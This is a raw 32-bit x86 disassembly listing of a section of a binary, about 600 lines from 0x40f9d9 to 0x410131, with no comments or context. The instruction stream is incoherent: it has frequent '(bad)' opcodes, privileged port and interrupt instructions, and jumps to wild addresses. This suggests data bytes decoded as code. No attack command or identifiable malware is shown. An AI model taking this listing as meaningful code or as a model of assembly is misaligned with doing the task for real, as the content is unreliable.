  40f9d9:	(bad)  
  40f9da:	cmp    eax,0x62d76ec2
  40f9df:	cmp    eax,DWORD PTR [esi-0x4ecfe5b9]
  40f9e5:	scas   eax,DWORD PTR es:[edi]
  40f9e6:	add    eax,DWORD PTR [edi]
  40f9e8:	jl     0x40f984
  40f9ea:	add    ch,BYTE PTR [ecx]
  40f9ec:	hlt    
  40f9ed:	dec    esp
  40f9ee:	rol    ecx,1
  40f9f0:	sbb    al,0xf0
  40f9f2:	nop
  40f9f3:	cmc    
  40f9f4:	cs adc ebp,eax
  40f9f7:	lock dec esi
  40f9f9:	xchg   esi,eax
  40f9fa:	stos   DWORD PTR es:[edi],eax
  40f9fb:	xor    DWORD PTR [eax],ecx
  40f9fd:	push   es
  40f9fe:	mov    edi,DWORD PTR ds:0x4e19f9d2
  40fa04:	sub    ebx,DWORD PTR [eax+0x79]
  40fa07:	cli    
  40fa08:	dec    esi
  40fa09:	pop    esp
  40fa0a:	lfs    eax,FWORD PTR [eax]
  40fa0d:	xchg   edi,eax
  40fa0e:	push   ecx
  40fa0f:	es dec edx
  40fa11:	stc    
  40fa12:	adc    BYTE PTR [eax+eiz*1+0x37037cf5],bh
  40fa19:	cwde   
  40fa1a:	pop    eax
  40fa1b:	cmp    BYTE PTR [ebx],dh
  40fa1d:	add    DWORD PTR fs:[eax+edi*8+0x2f],ecx
  40fa22:	cmp    al,0x2d
  40fa25:	jl     0x40fa41
  40fa27:	sub    bl,BYTE PTR [ecx-0x1]
  40fa2a:	push   es
  40fa2b:	fcom   DWORD PTR [edx-0x7f0cb776]
  40fa31:	xchg   ebx,eax
  40fa32:	pop    DWORD PTR [ecx]
  40fa34:	out    0x69,al
  40fa36:	pop    es
  40fa37:	push   0xef5bea0f
  40fa3c:	mov    ebp,0x894d21fe
  40fa41:	jbe    0x40f9eb
  40fa43:	nop
  40fa44:	add    ebx,ebp
  40fa46:	mov    bh,0x6a
  40fa48:	jl     0x40fa04
  40fa4a:	lea    ebp,[eax-0x7b0667f9]
  40fa50:	push   0xfffffffc
  40fa52:	les    edx,FWORD PTR [ecx]
  40fa54:	jno    0x40f9e1
  40fa56:	sub    ecx,esi
  40fa58:	inc    esi
  40fa59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa5a:	xchg   edi,eax
  40fa5b:	sbb    ch,BYTE PTR [ebx-0x3b]
  40fa5e:	or     dh,ch
  40fa60:	popf   
  40fa61:	dec    edx
  40fa62:	dec    edi
  40fa63:	inc    ebp
  40fa64:	xchg   esi,eax
  40fa65:	mov    DWORD PTR [edx+0x23],esi
  40fa68:	xlat   BYTE PTR ds:[ebx]
  40fa69:	fdiv   DWORD PTR [eax+0x891922d]
  40fa6f:	pop    ebx
  40fa70:	pop    edi
  40fa71:	aas    
  40fa72:	out    dx,al
  40fa73:	sti    
  40fa74:	add    eax,0x80250fb
  40fa79:	xchg   esp,eax
  40fa7a:	int3   
  40fa7b:	lods   eax,DWORD PTR ds:[esi]
  40fa7c:	cwde   
  40fa7d:	mov    al,0xa2
  40fa7f:	inc    esi
  40fa80:	xor    esp,DWORD PTR [ebx+0x43784c68]
  40fa86:	repnz dec ebx
  40fa88:	dec    ecx
  40fa89:	jmp    0xede7ed01
  40fa8e:	cwde   
  40fa8f:	pop    es
  40fa90:	or     edi,0xbf7eca90
  40fa96:	mov    bh,0x4b
  40fa98:	rcl    DWORD PTR [edx+0x64],1
  40fa9b:	cmp    eax,0xc76a8936
  40faa0:	push   edi
  40faa1:	and    eax,0xdfc406cc
  40faa6:	or     dl,dl
  40faa8:	call   0x18aa4471
  40faad:	loope  0x40fa37
  40faaf:	sub    al,0xea
  40fab1:	pop    esi
  40fab2:	mov    ss:0xa9d5e54d,eax
  40fab8:	pop    esp
  40fab9:	hlt    
  40faba:	push   edi
  40fabb:	add    al,0x1e
  40fabd:	cmp    eax,0x7673647f
  40fac2:	jns    0x40fa64
  40fac4:	mov    ch,0xe5
  40fac6:	mov    edx,0xcacca03
  40facb:	push   0x5b1ec8a
  40fad0:	cmp    eax,DWORD PTR [ecx]
  40fad2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad3:	xor    edx,edx
  40fad5:	dec    edi
  40fad6:	mov    esi,fs
  40fad8:	scas   eax,DWORD PTR es:[edi]
  40fad9:	mov    ecx,0x2f421594
  40fade:	xor    al,0xda
  40fae0:	mov    ebx,0xcf93c3ae
  40fae5:	push   0x2b
  40fae7:	ja     0x40fac1
  40fae9:	mov    ch,0x3
  40faeb:	pushf  
  40faec:	cmp    BYTE PTR [edi+0x10],ch
  40faef:	mov    ch,0xe4
  40faf1:	mov    ecx,0x6f34ed1
  40faf6:	data16 out 0xe0,al
  40faf9:	inc    eax
  40fafa:	sub    bl,BYTE PTR [esi-0x741e5457]
  40fb00:	pop    ebp
  40fb01:	jno    0x40fa9d
  40fb03:	add    edi,DWORD PTR [esi-0x1f]
  40fb06:	shr    BYTE PTR [ecx-0x5],cl
  40fb09:	cmp    ebx,DWORD PTR [edi+edx*8+0x20810203]
  40fb10:	mov    WORD PTR [ecx+edx*4-0x4b6f870a],es
  40fb17:	or     DWORD PTR [ecx-0x4],ecx
  40fb1a:	sti    
  40fb1b:	fwait
  40fb1c:	addr16 push ss
  40fb1e:	mov    dl,0x4
  40fb20:	pop    ebx
  40fb21:	mov    es:0xa20da6f6,eax
  40fb27:	hlt    
  40fb28:	pop    esp
  40fb29:	lahf   
  40fb2a:	dec    esi
  40fb2b:	xor    edx,DWORD PTR ds:0x65adbaee
  40fb31:	adc    DWORD PTR [ebx+0x47],esp
  40fb34:	xor    bh,BYTE PTR [esi+0x60]
  40fb37:	push   edi
  40fb38:	scas   eax,DWORD PTR es:[edi]
  40fb39:	stos   DWORD PTR es:[edi],eax
  40fb3a:	add    DWORD PTR [edx+0x522a313],0x386555c4
  40fb44:	push   esi
  40fb45:	jge    0x40fb1e
  40fb47:	xor    edx,DWORD PTR [edi]
  40fb49:	and    BYTE PTR [ebp-0x63],cl
  40fb4c:	sbb    ch,BYTE PTR [edi+eax*2+0x3917098e]
  40fb53:	fs test eax,0x7b47af36
  40fb59:	jae    0x40fae2
  40fb5b:	inc    edx
  40fb5c:	fisubr WORD PTR [edi+ebx*8]
  40fb5f:	sbb    esi,ebx
  40fb61:	fnstcw WORD PTR ds:0x229c919f
  40fb67:	div    BYTE PTR [ebp+0x9402ea4]
  40fb6d:	sub    DWORD PTR [esi+0x33],edi
  40fb70:	icebp  
  40fb71:	out    dx,eax
  40fb72:	fstp   QWORD PTR ds:0x6ca6cf5e
  40fb78:	mov    ecx,0x3f107964
  40fb7d:	lods   al,BYTE PTR ds:[esi]
  40fb7e:	push   es
  40fb7f:	add    BYTE PTR [ecx+edx*8],dh
  40fb82:	shr    BYTE PTR ds:0x6fd7c132,cl
  40fb88:	xchg   esi,eax
  40fb89:	ficom  WORD PTR cs:[esi]
  40fb8c:	fcomp  DWORD PTR [edi]
  40fb8e:	cmp    dl,dh
  40fb90:	adc    ebp,DWORD PTR [edx+0x48]
  40fb93:	xor    DWORD PTR [edi+0x409e3221],esp
  40fb99:	int    0x57
  40fb9b:	mov    ecx,0x66e08c2b
  40fba0:	out    dx,eax
  40fba1:	xor    ch,al
  40fba3:	jbe    0x40fb6e
  40fba5:	mov    esp,0x82050e08
  40fbaa:	mov    es,WORD PTR [edi-0x6d]
  40fbad:	inc    esp
  40fbae:	ret    
  40fbaf:	pusha  
  40fbb0:	aam    0xdf
  40fbb2:	out    dx,eax
  40fbb3:	xchg   ecx,eax
  40fbb4:	inc    ecx
  40fbb5:	xor    DWORD PTR [esi+edi*1-0x48dccf5f],edi
  40fbbc:	pop    ecx
  40fbbd:	idiv   bh
  40fbbf:	ja     0x40fb4f
  40fbc1:	stc    
  40fbc2:	stc    
  40fbc3:	shr    BYTE PTR fs:[edx],1
  40fbc6:	xchg   edx,eax
  40fbc7:	push   0xffffff96
  40fbc9:	fsubr  QWORD PTR [ecx+0x62]
  40fbcc:	pushf  
  40fbcd:	shl    DWORD PTR [ebp-0x62d9396f],cl
  40fbd3:	lahf   
  40fbd4:	pop    ss
  40fbd5:	sahf   
  40fbd6:	pusha  
  40fbd7:	xchg   ecx,eax
  40fbd8:	xor    al,0x5
  40fbda:	add    edi,DWORD PTR [ecx]
  40fbdc:	dec    ebp
  40fbdd:	push   esp
  40fbde:	test   DWORD PTR [ebx],ebp
  40fbe0:	int3   
  40fbe1:	sbb    eax,0x979efb0f
  40fbe6:	nop
  40fbe7:	add    eax,0xb952b1f0
  40fbec:	xchg   edx,eax
  40fbed:	jno    0x40fb99
  40fbef:	jb     0x40fc3f
  40fbf1:	shl    DWORD PTR [ebp-0x6d],cl
  40fbf4:	pop    eax
  40fbf5:	cli    
  40fbf6:	dec    esi
  40fbf7:	cmc    
  40fbf8:	xor    bl,dl
  40fbfa:	xchg   esp,eax
  40fbfb:	fcomp  DWORD PTR [esi+0x5772042]
  40fc01:	ror    ebp,1
  40fc03:	push   ebp
  40fc04:	jae    0x40fc42
  40fc06:	fstp   TBYTE PTR [edx+0x39ded82]
  40fc0c:	mov    eax,ds:0x55165a79
  40fc11:	cs dec ebp
  40fc13:	xchg   edx,eax
  40fc15:	sub    eax,esp
  40fc17:	fdiv   st(6),st
  40fc19:	cmp    BYTE PTR [edx+0x40db8298],ch
  40fc1f:	or     esp,esi
  40fc21:	mov    ebp,0xd3c66ef2
  40fc26:	stos   BYTE PTR es:[edi],al
  40fc27:	sahf   
  40fc28:	pop    edx
  40fc29:	cmp    ebp,DWORD PTR [eax+0x56]
  40fc2c:	fcom   DWORD PTR [ebx]
  40fc2e:	out    dx,al
  40fc2f:	lods   eax,DWORD PTR ds:[esi]
  40fc30:	mov    esp,0x8fae8d94
  40fc35:	ds aad 0x89
  40fc38:	in     eax,dx
  40fc39:	xlat   BYTE PTR ds:[ebx]
  40fc3a:	aaa    
  40fc3b:	and    al,0x3d
  40fc3d:	dec    edi
  40fc3e:	ds dec edi
  40fc40:	dec    edi
  40fc41:	fcmovb st,st(5)
  40fc43:	and    dh,BYTE PTR [esp+ebx*4-0x5ca6bceb]
  40fc4a:	imul   ebx,DWORD PTR [ecx-0x4ebbf4b],0xfa3a9569
  40fc54:	jmp    0xc98f76d4
  40fc59:	je     0x40fc38
  40fc5b:	push   ebx
  40fc5c:	rcr    cl,cl
  40fc5e:	adc    ebx,DWORD PTR [eax+0x7e50239b]
  40fc64:	pop    ss
  40fc65:	add    dh,BYTE PTR [eax+0x29]
  40fc68:	fstp   DWORD PTR fs:0x98ae1f8e
  40fc6f:	lds    edx,FWORD PTR [ebp+0x546cc9b0]
  40fc75:	lea    esi,ds:[edx]
  40fc78:	and    al,0x2
  40fc7a:	inc    eax
  40fc7b:	mov    esi,esp
  40fc7d:	dec    edx
  40fc7e:	(bad)  
  40fc7f:	scas   eax,DWORD PTR es:[edi]
  40fc80:	ret    
  40fc81:	dec    eax
  40fc82:	jg     0x40fc60
  40fc84:	jno    0x40fc1a
  40fc86:	sahf   
  40fc87:	in     al,0x37
  40fc89:	leave  
  40fc8a:	jg     0x40fc67
  40fc8c:	jl     0x40fd00
  40fc8e:	test   eax,0x97216d9d
  40fc93:	das    
  40fc94:	mov    dl,0xcc
  40fc96:	push   ebx
  40fc97:	fild   WORD PTR [edi-0x64bcdcdb]
  40fc9d:	(bad)  
  40fc9e:	cmc    
  40fc9f:	pusha  
  40fca0:	jno    0x40fce8
  40fca2:	call   0x8d3cb5a6
  40fca7:	fcomp  DWORD PTR [ebp-0x49]
  40fcaa:	es (bad) 
  40fcac:	repz test BYTE PTR [ebx],0x30
  40fcb0:	retf   
  40fcb1:	idiv   edi
  40fcb3:	or     BYTE PTR [edi-0x7f],bl
  40fcb6:	test   BYTE PTR ds:0x74b6dd85,bh
  40fcbc:	sbb    al,BYTE PTR [esi+0x71]
  40fcbf:	inc    esi
  40fcc0:	jge    0x40fcd1
  40fcc2:	in     eax,0x1
  40fcc4:	(bad)  
  40fcc5:	enter  0x4b1e,0x13
  40fcc9:	fsub   DWORD PTR ds:0xe4633463
  40fccf:	add    cl,BYTE PTR [ebp-0xea71fc2]
  40fcd5:	sbb    bl,dh
  40fcd7:	retf   0xe073
  40fcda:	cmc    
  40fcdb:	mov    dl,0x5a
  40fcdd:	mov    bl,0x5e
  40fcdf:	mov    cl,0x3
  40fce1:	xchg   DWORD PTR [edx-0x9],edx
  40fce4:	xchg   esp,eax
  40fce5:	mov    WORD PTR [ecx+0x64],?
  40fce8:	xchg   BYTE PTR [edx+0x38d6d7c5],bh
  40fcee:	xor    BYTE PTR [ebx-0x41e177c5],0x9b
  40fcf5:	ja     0x40fce1
  40fcf7:	and    cl,BYTE PTR [ebp+0x5456bb5d]
  40fcfd:	in     al,0x60
  40fcff:	add    eax,0x8d4aafe0
  40fd04:	xor    BYTE PTR [edi-0x9],bh
  40fd07:	jg     0x40fd2b
  40fd09:	push   ebp
  40fd0a:	stos   DWORD PTR es:[edi],eax
  40fd0b:	mov    ch,BYTE PTR [edx]
  40fd0d:	fcmovbe st,st(6)
  40fd0f:	xor    edx,eax
  40fd11:	int3   
  40fd12:	imul   edi,DWORD PTR [esi],0x93d98f93
  40fd18:	sbb    ecx,DWORD PTR [bp-0x2d]
  40fd1c:	fistp  QWORD PTR [edx]
  40fd1e:	or     esp,0xffffffc5
  40fd21:	fwait
  40fd22:	sub    DWORD PTR fs:[ebx],esp
  40fd25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd26:	ds mov dh,bl
  40fd29:	daa    
  40fd2a:	jbe    0x40fd8c
  40fd2c:	inc    ecx
  40fd2d:	adc    esp,DWORD PTR [ecx+0x33891ff0]
  40fd33:	(bad)  
  40fd34:	adc    al,0x2e
  40fd36:	imul   esp,DWORD PTR fs:[ecx],0x12
  40fd3a:	pop    ss
  40fd3b:	ss or  al,0xf4
  40fd3e:	rol    BYTE PTR [esi],1
  40fd40:	(bad)  
  40fd41:	jno    0x40fcd4
  40fd43:	xchg   esp,eax
  40fd44:	push   0x29adbe7d
  40fd49:	std    
  40fd4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd4b:	loopne 0x40fd2e
  40fd4d:	aaa    
  40fd4e:	int    0xe0
  40fd50:	jp     0x40fd7f
  40fd52:	int    0x1c
  40fd54:	div    ecx
  40fd56:	pusha  
  40fd57:	inc    ebx
  40fd58:	cs in  eax,dx
  40fd5a:	push   edi
  40fd5b:	in     eax,0xcd
  40fd5d:	pop    edx
  40fd5e:	inc    esp
  40fd5f:	imul   edi,DWORD PTR [esi+0x2b7c792b],0xbec17f58
  40fd69:	mov    eax,0xf5ec121f
  40fd6e:	(bad)
  40fd71:	not    DWORD PTR [esi+0x6b]
  40fd74:	stos   BYTE PTR es:[edi],al
  40fd75:	inc    edi
  40fd76:	fs push edi
  40fd78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd79:	jp     0x40fda7
  40fd7b:	push   0xf28dfd0b
  40fd80:	ja     0x40fddb
  40fd82:	in     al,0xf
  40fd84:	push   es
  40fd85:	pop    eax
  40fd86:	repz push esi
  40fd88:	in     al,dx
  40fd89:	nop
  40fd8a:	test   DWORD PTR [eax],0xaf9e0e2b
  40fd90:	psubsw mm6,QWORD PTR [ebp+0x1fa1e982]
  40fd97:	dec    edx
  40fd98:	aad    0xa2
  40fd9a:	xor    eax,0x70ba1f
  40fd9f:	loopne 0x40fd4d
  40fda1:	clc    
  40fda2:	shr    ebx,cl
  40fda4:	pop    ss
  40fda5:	dec    esp
  40fda6:	leave  
  40fda7:	outs   dx,DWORD PTR ds:[esi]
  40fda8:	sub    DWORD PTR [ecx-0x75],edi
  40fdab:	lea    esp,[ebp-0x45]
  40fdae:	arpl   sp,di
  40fdb0:	mov    ah,0xdd
  40fdb2:	xchg   ebx,eax
  40fdb3:	pop    edx
  40fdb4:	mov    ah,0x41
  40fdb6:	adc    al,0xdf
  40fdb8:	idiv   BYTE PTR [esi-0x5cce2643]
  40fdbe:	pop    edi
  40fdbf:	leave  
  40fdc0:	add    BYTE PTR [esi-0x76399d0f],0x67
  40fdc7:	pop    edi
  40fdc8:	int    0x7e
  40fdca:	popf   
  40fdcb:	push   0xb2edc2d9
  40fdd0:	leave  
  40fdd1:	inc    esi
  40fdd2:	pop    edx
  40fdd3:	xchg   ecx,eax
  40fdd4:	mov    ch,0x6c
  40fdd6:	and    al,0xfa
  40fdd8:	jo     0x40fd83
  40fdda:	push   esp
  40fddb:	popa   
  40fddc:	add    BYTE PTR [ebx-0x7a],bh
  40fddf:	pop    esi
  40fde0:	add    DWORD PTR [ecx],ecx
  40fde2:	jle    0x40fdeb
  40fde4:	pop    ebp
  40fde5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fde6:	cmp    al,0xa2
  40fde8:	cs retf 0xd5f7
  40fdec:	(bad)  
  40fded:	and    ch,dl
  40fdef:	mul    BYTE PTR ds:0x47a70240
  40fdf5:	dec    edi
  40fdf6:	je     0x40fdd7
  40fdf8:	jbe    0x40fe75
  40fdfa:	call   0x1475156c
  40fdff:	mov    ah,0x41
  40fe01:	leave  
  40fe02:	mov    bh,cl
  40fe04:	cld    
  40fe05:	mov    cl,0x2a
  40fe07:	cmp    eax,0x413f4284
  40fe0c:	xchg   esi,eax
  40fe0d:	mov    al,0xb8
  40fe0f:	and    bl,0x70
  40fe12:	clc    
  40fe13:	and    DWORD PTR [ecx],esp
  40fe15:	out    dx,al
  40fe16:	pop    ds
  40fe17:	xchg   DWORD PTR [edx+0x58816248],edx
  40fe1d:	data16 jnp 0x40fdbc
  40fe20:	mov    dh,BYTE PTR ss:[esi+edi*8]
  40fe24:	dec    ecx
  40fe25:	add    DWORD PTR [edi+0x33f7bdcc],eax
  40fe2b:	scas   al,BYTE PTR es:[edi]
  40fe2c:	mov    esp,0x3be1bf98
  40fe31:	test   DWORD PTR [ebx-0x5449d183],edx
  40fe37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe39:	jge    0x40fddf
  40fe3b:	out    0x27,al
  40fe3d:	into   
  40fe3e:	adc    al,0x96
  40fe40:	loop   0x40fde4
  40fe42:	jge    0x40fdf5
  40fe44:	mov    bh,0xbd
  40fe46:	in     al,dx
  40fe47:	add    al,0xa0
  40fe49:	arpl   WORD PTR [esi-0x1f508f31],cx
  40fe4f:	dec    ecx
  40fe50:	xchg   DWORD PTR [eax+0x73],eax
  40fe53:	sub    DWORD PTR [eax+0x10],eax
  40fe56:	test   DWORD PTR [esi+ebx*2],0x9fd96d40
  40fe5d:	jno    0x40fe60
  40fe5f:	mov    ebx,0x8c6fd52f
  40fe64:	aas    
  40fe65:	jge    0x40fe42
  40fe67:	sbb    edx,DWORD PTR ds:0xfd1bd205
  40fe6d:	push   ds
  40fe6e:	jg     0x40fdf4
  40fe70:	(bad)  
  40fe71:	hlt    
  40fe72:	mov    WORD PTR [edi],sp
  40fe75:	jge    0x40feb7
  40fe77:	sub    al,0x94
  40fe79:	mov    ebp,0xca4640ff
  40fe7e:	out    dx,al
  40fe7f:	add    DWORD PTR [ebp-0x4],edi
  40fe82:	fnstsw WORD PTR [eax+esi*8]
  40fe85:	cmp    al,BYTE PTR [ebx+ecx*4-0x3c]
  40fe89:	fmul   QWORD PTR [ebx-0x53]
  40fe8c:	ds mov bl,al
  40fe8f:	xor    BYTE PTR gs:[ecx+ecx*4+0x2199c490],al
  40fe97:	lds    ebp,FWORD PTR [edx-0x791a3db8]
  40fe9d:	fistp  DWORD PTR [ebx]
  40fe9f:	lods   eax,DWORD PTR ds:[esi]
  40fea0:	ins    DWORD PTR es:[edi],dx
  40fea1:	sub    BYTE PTR [eax+0x7cbc466],cl
  40fea7:	inc    eax
  40fea8:	test   eax,0xc6f97e10
  40fead:	push   ebx
  40feae:	mov    eax,0x5541437e
  40feb3:	adc    al,0x83
  40feb5:	in     al,dx
  40feb6:	icebp  
  40feb7:	push   edx
  40feb8:	pop    ebx
  40feb9:	cli    
  40feba:	dec    esi
  40febb:	cmp    esi,DWORD PTR [ebx]
  40febd:	inc    ecx
  40febe:	mov    ebp,gs
  40fec0:	lock push cs
  40fec2:	fucom  st(6)
  40fec4:	inc    esp
  40fec5:	ins    DWORD PTR es:[edi],dx
  40fec6:	imul   esi,DWORD PTR [edi+0x68c79eaa],0x1b8e699d
  40fed0:	or     eax,0x550684b1
  40fed5:	cmp    ecx,DWORD PTR [edx+ecx*8]
  40fed8:	mov    dl,BYTE PTR [edi]
  40feda:	and    esp,0x14
  40fedd:	inc    esp
  40fede:	and    BYTE PTR [ecx],bl
  40fee0:	loop   0x40feb2
  40fee2:	dec    ebx
  40fee3:	jmp    0x40fead
  40fee5:	aam    0x35
  40fee7:	mov    eax,0x18152470
  40feec:	push   ebx
  40feed:	fdiv   DWORD PTR [ecx+0x3c36d324]
  40fef3:	(bad)  
  40fef4:	cwde   
  40fef5:	cmp    eax,DWORD PTR [ecx]
  40fef7:	out    0xba,al
  40fef9:	rol    BYTE PTR [ebp-0x695d69fb],cl
  40feff:	dec    ebp
  40ff00:	dec    edx
  40ff01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff02:	int3   
  40ff03:	sbb    al,0xe7
  40ff05:	daa    
  40ff06:	retf   0x84dd
  40ff09:	mov    cl,0xe3
  40ff0b:	cmp    esp,esi
  40ff0d:	pop    ebp
  40ff0e:	loop   0x40ff4e
  40ff10:	dec    esp
  40ff11:	mov    eax,0x832ff8c
  40ff16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff17:	pop    ds
  40ff18:	gs jecxz 0x40ff4a
  40ff1b:	fisttp DWORD PTR ds:0xd7ed9635
  40ff21:	popa   
  40ff22:	adc    dh,BYTE PTR [edx-0x338ec00f]
  40ff28:	icebp  
  40ff29:	repz sub eax,eax
  40ff2c:	call   0x8928637b
  40ff31:	in     eax,dx
  40ff32:	cmp    ecx,DWORD PTR [eax-0x2]
  40ff35:	pusha  
  40ff36:	pop    ebx
  40ff37:	push   edx
  40ff38:	std    
  40ff39:	push   ss
  40ff3a:	enter  0x8e87,0x4c
  40ff3e:	or     BYTE PTR [ebx+0x13],bh
  40ff41:	xor    dl,ch
  40ff43:	test   DWORD PTR [ebp-0x14],ecx
  40ff46:	jge    0x40ffc4
  40ff48:	push   cs
  40ff49:	aaa    
  40ff4a:	inc    edx
  40ff4b:	xor    esp,DWORD PTR [ecx+0x539a9c45]
  40ff51:	aad    0x3e
  40ff53:	lea    ebp,[edx-0x19]
  40ff56:	xor    dh,BYTE PTR [ecx]
  40ff58:	jae    0x40ffad
  40ff5a:	jnp    0x40ff86
  40ff5c:	add    esp,esp
  40ff5e:	cmp    DWORD PTR ds:0x5df528d3,edx
  40ff64:	ins    BYTE PTR es:[edi],dx
  40ff65:	icebp  
  40ff66:	xchg   BYTE PTR [esi-0x80],bh
  40ff69:	mov    ecx,0x376c43e6
  40ff6e:	xchg   edi,esi
  40ff70:	xor    DWORD PTR [ebx],edi
  40ff72:	clc    
  40ff73:	cmp    BYTE PTR [ecx+0x6a],ah
  40ff76:	xor    ax,0x2912
  40ff7a:	or     BYTE PTR [edi],0x89
  40ff7d:	mov    dh,0xf6
  40ff7f:	mov    al,ds:0x146d0b91
  40ff84:	xor    al,BYTE PTR ds:0x38d57f3b
  40ff8a:	dec    esi
  40ff8b:	das    
  40ff8c:	adc    eax,0x82a8596f
  40ff91:	popf   
  40ff92:	sbb    eax,0xf9879a28
  40ff97:	jle    0x40ff61
  40ff99:	jg     0x40ff61
  40ff9b:	jne    0x40ff5f
  40ff9d:	push   ecx
  40ff9e:	sub    BYTE PTR [esi-0x12166c10],bh
  40ffa4:	fsub   QWORD PTR [esi]
  40ffa6:	xchg   esp,eax
  40ffa7:	mov    bh,0x7b
  40ffa9:	lods   al,BYTE PTR ds:[esi]
  40ffaa:	xchg   esp,eax
  40ffab:	or     al,0x91
  40ffad:	test   eax,0xdbdc1172
  40ffb2:	cld    
  40ffb3:	lock retf 0xffe0
  40ffb7:	sbb    dl,ch
  40ffb9:	cmp    al,0xeb
  40ffbb:	xlat   BYTE PTR ds:[ebx]
  40ffbc:	or     ah,dl
  40ffbe:	cdq    
  40ffbf:	xchg   ecx,eax
  40ffc0:	cmp    BYTE PTR [edx+ecx*1],0x5
  40ffc4:	fcmovb st,st(6)
  40ffc6:	ja     0x410016
  40ffc8:	pop    es
  40ffc9:	fsubr  st,st(0)
  40ffcb:	mov    esi,0x970dfee5
  40ffd0:	scas   al,BYTE PTR es:[edi]
  40ffd1:	loop   0x40ffa7
  40ffd3:	jmp    DWORD PTR [edi+ebx*8]
  40ffd6:	fld    DWORD PTR [eax-0x199a648d]
  40ffdc:	lods   eax,DWORD PTR ds:[esi]
  40ffdd:	adc    BYTE PTR [edx+0x567b025c],dl
  40ffe3:	fs fcom st(3)
  40ffe6:	jle    0x40ffa3
  40ffe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffe9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffea:	or     bl,BYTE PTR [ecx+eiz*8-0x18]
  40ffee:	ror    DWORD PTR [esp+eiz*8],0xec
  40fff2:	leave  
  40fff3:	sbb    DWORD PTR [ecx-0x75],0xffffffe0
  40fff7:	mov    dl,0x5
  40fff9:	cmc    
  40fffa:	sub    BYTE PTR [ebp-0x3d09d7f7],0x6d
  410001:	sti    
  410002:	mov    ds:0x75a805ce,eax
  410007:	dec    DWORD PTR [edi-0x3edbf6f]
  41000d:	imul   DWORD PTR [edi-0x42]
  410010:	mov    ds:0x37364069,eax
  410015:	(bad)  
  410016:	jae    0x41005f
  410018:	push   edi
  410019:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41001a:	mov    WORD PTR [ebx-0x5137bcc4],ss
  410020:	idiv   DWORD PTR [edx-0x55]
  410023:	test   DWORD PTR [ebx],eax
  410025:	ret    0x50e7
  410028:	add    BYTE PTR [eax],cl
  41002a:	jl     0x41007e
  41002c:	pop    esp
  41002d:	imul   eax,DWORD PTR [edi],0xffffffd5
  410030:	push   es
  410031:	and    DWORD PTR [ecx+0x7d],edi
  410034:	js     0x40ffda
  410036:	ret    0x2c1e
  410039:	pop    ecx
  41003a:	jne    0x4100a8
  41003c:	xchg   ecx,eax
  41003d:	jmp    0x54747a9
  410042:	or     eax,0xc23c2be1
  410047:	jle    0x410031
  410049:	(bad)  
  41004b:	cmp    al,0x38
  41004d:	push   ds
  41004e:	aaa    
  41004f:	ds enterw 0x38bd,0xd0
  410055:	or     dl,ah
  410057:	addr16 aaa 
  410059:	lods   al,BYTE PTR ds:[esi]
  41005a:	jecxz  0x410087
  41005c:	or     eax,0x1b0de9dc
  410061:	push   ss
  410062:	mov    dh,BYTE PTR [esi+0x6a]
  410065:	sbb    ch,bh
  410067:	loopne 0x41008c
  410069:	pop    eax
  41006a:	cld    
  41006b:	push   cs
  41006c:	add    BYTE PTR [ecx-0x482c8d5f],bh
  410072:	int3   
  410073:	bound  eax,QWORD PTR [esi+ebp*4]
  410076:	sbb    eax,0xfb2cb727
  41007b:	loop   0x410029
  41007d:	push   ebx
  41007e:	stos   DWORD PTR es:[edi],eax
  41007f:	mov    edx,0x16f4b12c
  410084:	call   0x6d5c:0xc971e0e8
  41008b:	mov    ebx,0x1114f48e
  410090:	ds and eax,0x764c7f4e
  410096:	adc    eax,0x6ae00d89
  41009b:	and    ebp,DWORD PTR [edi-0x628df4ae]
  4100a1:	popa   
  4100a2:	push   cs
  4100a3:	pop    ebp
  4100a4:	adc    DWORD PTR [eax],esi
  4100a6:	test   DWORD PTR [ebx],0x1742ad21
  4100ac:	outs   dx,DWORD PTR ds:[esi]
  4100ad:	(bad)  
  4100ae:	and    eax,0x61f7c68e
  4100b3:	fucom  st(5)
  4100b5:	pop    edx
  4100b6:	mov    ebx,0xe6639fb0
  4100bb:	xchg   esi,eax
  4100bc:	int    0x20
  4100be:	std    
  4100bf:	xor    esp,DWORD PTR ss:[eax-0x40c0ea49]
  4100c6:	outs   dx,DWORD PTR ds:[esi]
  4100c7:	xchg   ebx,eax
  4100c8:	mov    BYTE PTR [eax+0x33],ah
  4100cb:	dec    edx
  4100cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100cd:	mov    ebp,0x3ea68f1
  4100d2:	xor    al,0xbb
  4100d4:	sub    ah,dh
  4100d6:	dec    eax
  4100d7:	js     0x41006d
  4100d9:	out    dx,eax
  4100da:	jnp    0x4100ef
  4100dc:	mov    ebx,DWORD PTR [ecx+0x5631bbe5]
  4100e2:	cwde   
  4100e3:	inc    edi
  4100e4:	adc    edi,ebx
  4100e6:	test   DWORD PTR [esi+edx*1+0x5311b437],eax
  4100ed:	mov    ch,dl
  4100ef:	push   ds
  4100f0:	mov    edi,DWORD PTR [eax-0x76]
  4100f3:	and    BYTE PTR [edi+eiz*8],0xef
  4100f7:	and    eax,0x49d7db28
  4100fc:	jne    0x4100d1
  4100fe:	mov    al,0x92
  410100:	mov    esp,0xeef821c2
  410105:	add    eax,0x5dfb3495
  41010a:	mov    ds:0xe30c8fcb,eax
  41010f:	and    DWORD PTR [edi+0x5e],esi
  410112:	xchg   DWORD PTR [edi+0x58907041],ecx
  410118:	call   0xad6acd47
  41011d:	or     al,0x95
  41011f:	test   ebp,esi
  410121:	push   esp
  410122:	mov    al,0x46
  410124:	xlat   BYTE PTR ds:[ebx]
  410125:	leave  
  410126:	cmp    eax,DWORD PTR ds:0xb7388817
  41012c:	mov    al,0xff
  41012e:	lock pop ss
  410130:	std    
  410131:	sahf   
